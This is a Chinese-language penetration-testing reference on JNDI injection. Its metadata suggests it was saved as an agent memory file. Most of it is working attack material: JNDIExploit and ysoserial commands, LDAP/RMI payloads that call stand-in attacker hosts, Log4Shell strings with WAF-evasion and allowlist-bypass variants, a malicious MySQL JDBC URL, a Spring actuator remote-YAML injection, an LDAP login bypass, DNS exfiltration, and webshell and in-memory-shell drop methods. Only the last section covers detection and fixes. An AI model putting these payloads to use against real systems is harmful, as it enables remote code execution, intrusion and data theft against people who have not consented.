---
name: kb_jndi_injection_2026
description: JNDI注入原理—RMI/LDAP/LDAPS/DNS/CORBA/高版本JDK绕过/Log4j/Spring/工具链
metadata: 
  node_type: memory
  type: reference
  originSessionId: 5d675b98-bcc4-43f6-b8de-46635cd0836f
---

# JNDI 注入专题 (2026版)

## 一、JNDI 基础

### JNDI 协议类型
| 协议 | 端口 | 说明 |
|------|------|------|
| RMI | 1099 | 远程方法调用，最常用 |
| LDAP | 389/636 | 轻量目录，高版本主要利用方式 |
| LDAPS | 636 | SSL加密LDAP |
| DNS | 53 | DNS查询(DNSLog用) |
| CORBA | 1050 | IIOP，Weblogic常用 |

### JDK 版本限制演进
| JDK版本 | 限制 |
|------|------|
| < 8u121 | 无限制，RMI remote class loading 直接可用 |
| 8u121-8u190 | RMI限制: `trustURLCodebase=false` 默认，但LDAP可绕过 |
| 8u191+ | LDAP也限制: `trustURLCodebase=false` 默认 |
| 11.0.1+ / 17+ | 同样限制，需绕 `trustCodebaseURL` |

---

## 二、JNDI 注入利用模型

### 经典三层
```
Client (存在JNDI注入) → JNDI Server (LDAP/RMI) → HTTP Server (提供.class)
```

### 工具: JNDIExploit
```bash
# 启动恶意JNDI服务端
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i attacker_ip -p 8888 -l 1389
```

### 基础 Payload 模板
```
# RMI
rmi://attacker:1099/evil

# LDAP
ldap://attacker:1389/evil

# 高版本绕过(需要受害者本地有可利用类)
ldap://attacker:1389/evil;javaSerializedData=<base64_serialized>
```

---

## 三、高版本 JDK 绕过技术 (8u191+ / 11+ / 17+)

### 绕过 1: 利用本地 Gadget (javaSerializedData)
**原理**: LDAP 虽然限制远程加载 class，但 `javaSerializedData` 属性仍可触发本地反序列化
```
ldap://attacker:1389/cn=evil,ou=javaSerializedData,dc=exp
→ 服务端返回javaSerializedData属性(内含反序列化payload)
→ 受害者本地反序列化触发(需要本地有CC/CB等gadget)
```

### 绕过 2: 利用本地 ClassPath 中的 Factory
**条件**: 目标 classpath 中有可用的 ObjectFactory
```
ldap://attacker:1389/cn=BeanFactory  (利用tomcat的BeanFactory)
ldap://attacker:1389/cn=GroovyShell  (利用groovy的GroovyShell)
```

### 绕过 3: DNS JNDI 信息外带
虽然不能RCE，但可用DNS JNDI做信息外带（盲注）：
```
ldap://${sys:java.version}.attacker.com/evil → DNS记录泄露JDK版本
```

### 绕过 4: CORBA/IIOP 协议
WebLogic 等产品自带 IIOP，JNDI→CORBA→IIOP 可能绕过 JDK 原生的 RMI/LDAP 限制

### 绕过 5: 利用 JDBC 连接池
```
jdbc:mysql://attacker:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
→ MySQL恶意服务端→反序列化 (C3P0/Druid/DBCP)
```

---

## 四、RMI 利用

### RMI 注册表探测
```bash
# 探测RMI服务
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target 1099 CommonsCollections6 "whoami"
```

### RMI 反序列化链
- RMI客户端→服务端调用: 服务端反序列化客户端传来的参数
- RMI服务端→客户端回调: 客户端反序列化服务端返回的remote object

### RMI服务端攻击 (服务端反序列化客户端参数)
```
# 直接用 ysoserial
java -jar ysoserial.jar JRMPClient attacker:4444 | base64
# 发送到目标RMI端口
```

---

## 五、LDAP 注入

### 场景 1: 目录查询 LDAP 注入(认证绕过)
```
username=*&password=*
→ filter: (&(uid=*)(userPassword=*))  # 万能登录

username=admin)(|(uid=admin&password=
→ filter: (&(uid=admin)(|(uid=admin)(userPassword=)))
```

### 场景 2: JNDI LDAP RCE
```
${jndi:ldap://attacker:1389/evil}
```

---

## 六、Log4j (Log4Shell) CVE-2021-44228

### 影响范围
log4j-core 2.0~2.14.1, 2.15.0可绕过

### Payload
```
${jndi:ldap://attacker:1389/evil}
${jndi:rmi://attacker:1099/evil}
${jndi:dns://attacker/evil}
${${lower:j}ndi:ldap://attacker/evil}         # WAF绕过1
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/evil}  # WAF绕过2
${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker/evil}  # env绕过
${jndi:ldap://127.0.0.1#attacker.com/evil}    # 白名单绕过
```

### Log4j 2.15.0 绕过 (CVE-2021-45046)
```
${jndi:ldap://127.0.0.1#attacker.com:1389/evil}  # 主机名校验只检查了#
```

### 注入点探测优先级
```
1. HTTP Header: User-Agent/X-Forwarded-For/Referer/Cookie/Origin
2. GET/POST参数
3. 日志文件导入(JSON/XML解析)
4. 消息队列消费端
```

---

## 七、Spring 环境 JNDI 利用

### Spring Cloud Gateway + JNDI
```
GET /actuator/gateway/routes → 添加含 ${jndi:ldap://x.x.x.x/evil} 的路由
```

### Spring Boot actuator/env 注入
```
POST /actuator/env
{"name":"spring.cloud.bootstrap.location", "value":"http://attacker/evil.yml"}
→ 远程YAML→SnakeYAML反序列化→JNDI
```

### Spring Messaging (CVE-2018-1270)
- WebSocket STOMP 协议中 SpEL注入 → JNDI RCE

---

## 八、常用绕过WAF的JNDI Payload

```
# 大小写
${jNdI:ldap://x.x.x.x/evil}

# 嵌套lower/upper
${${lower:jn}di:ldap://x.x.x.x/evil}

# 空字符串插入
${${::-j}ndi:ldap://x.x.x.x/evil}

# 多个lookup
${${lower:${lower:jndi}}:ldap://x.x.x.x/evil}

# 利用系统属性
${${sys:java.version}:-j}ndi:ldap://x.x.x.x/evil

# date math
${${date:yyyy}ndi:ldap://x.x.x.x/evil}

# resource bundle
${${ctx:loginTest}:jndi:ldap://x.x.x.x/evil}
```

---

## 九、无回显/不出网 JNDI 利用方案

1. **DNSLog外带**: `${jndi:dns://${sys:java.version}.dnslog.cn}`
2. **写文件落地**: LDAP返回ReferenceClass→静态代码块写webshell到webroot
3. **内存马注入**: 利用JNDI加载内存马class→注入Tomcat/Spring容器
4. **Blind JNDI**: 利用sleep/delay判断执行结果
5. **HTTP外带**: `${jndi:ldap://x/evil}` 配合恶意LDAP服务器返回HTTP引用

---

## 十、检测与防护

### 检测方法
```
1. DNSLog: 所有可控输入发送 ${jndi:dns://dnslog/xxx}
2. Burp Collaborator: 同上
3. 响应内容: 部分框架会报错暴露classpath/version
4. 延时判断: 若DNS不可用，用超时LDAP连接判断
```

### 修复优先级
```
1. Log4j: ≥2.17.1 / 删除JndiLookup类: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
2. JDK: 升级 8u191+ / 17.0.3+ 限制JNDI远程加载
3. WAF: 拦截 ${jndi: / ${jndi:ldap:// / ${jndi:rmi://
4. 全局配置: -Dcom.sun.jndi.ldap.object.trustURLCodebase=false / ALLOWED_JNDI_PROTOCOLS
```